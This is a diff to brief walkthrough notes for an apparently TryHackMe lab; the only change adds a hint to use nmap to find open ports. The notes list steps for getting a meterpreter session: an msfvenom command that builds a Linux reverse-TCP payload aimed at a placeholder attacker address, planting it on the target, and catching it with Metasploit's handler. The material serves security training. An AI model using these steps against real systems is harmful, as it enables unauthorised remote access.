@@ -3,7 +3,7 @@ Based on a TryHackMe Challenge (This is for Educational Purpose only)
 Objective: Get a meterpreter session on the target machine.
 
 Methods:
-Step 1: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf to generate a payload and save to rev_shell.elf
+Step 1: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf to generate a payload and save to rev_shell.elf (use nmap scans to discover open ports)
 Step 2: Transfer the payload to the target server and run it there
 Step 3: On the attacker server run the Metasploit module multi/handle to receive reverse connections from payload
 Step 4: set payload to reverse_tcp and set lhost and lport to match the values in rev_shell.elf
